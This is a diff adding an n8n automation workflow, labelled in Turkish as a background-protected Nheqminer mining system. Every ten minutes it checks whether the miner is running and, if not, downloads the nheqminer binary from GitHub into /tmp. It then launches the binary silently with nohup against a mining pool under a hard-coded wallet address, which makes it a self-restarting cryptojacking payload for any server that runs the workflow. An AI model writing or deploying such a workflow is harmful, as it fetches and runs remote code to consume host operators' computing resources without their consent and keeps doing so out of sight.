@@ -1,0 +1,56 @@
+{
+  "name": "Orijinal Nheqminer (Arka Plan Korumalı) Kazım Sistemi",
+  "nodes": [
+    {
+      "parameters": {
+        "rule": {
+          "interval": [
+            {
+              "field": "minutes",
+              "minutesInterval": 10
+            }
+          ]
+        }
+      },
+      "type": "n8n-nodes-base.scheduleTrigger",
+      "typeVersion": 1.1,
+      "position": [
+        0,
+        0
+      ],
+      "id": "schedule-trigger",
+      "name": "Her 10 Dakikada Kontrol Et"
+    },
+    {
+      "parameters": {
+        "command": "if ! ps | grep -v grep | grep -q \"nheqminer\"\nthen\n    echo \"Madenci çalışmıyor, başlatılıyor...\"\n    mkdir -p /tmp/miner\n    cd /tmp/miner\n    if [ ! -f ./nheqminer ]; then\n        wget -q https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz\n        tar -xf nheqminer-Linux-v0.8.2.tgz\n        mv nheqminer/nheqminer .\n        chmod +x nheqminer\n    fi\n    # Arka planda başlatalım ki n8n kilitlenmesin (& işareti ile)\n    nohup ./nheqminer -v -l eu.luckpool.net:3956 -u RTDTYfTX9a8DdAfr9won6DspWxxobgxE21.AutoServer -p x -t 2 > /dev/null 2>&1 &\n    echo \"BİLGİ: Madenci arka planda başarıyla başlatıldı.\"\nelse\n    echo \"BİLGİ: Madenci zaten arka planda sorunsuz çalışıyor.\"\nfi"
+      },
+      "type": "n8n-nodes-base.executeCommand",
+      "typeVersion": 1,
+      "position": [
+        240,
+        0
+      ],
+      "id": "execute-miner",
+      "name": "Miner'ı Arka Planda Korumalı Çalıştır"
+    }
+  ],
+  "pinData": {},
+  "connections": {
+    "Her 10 Dakikada Kontrol Et": {
+      "main": [
+        [
+          {
+            "node": "Miner'ı Arka Planda Korumalı Çalıştır",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  },
+  "active": false,
+  "settings": {
+    "executionOrder": "v1"
+  }
+}
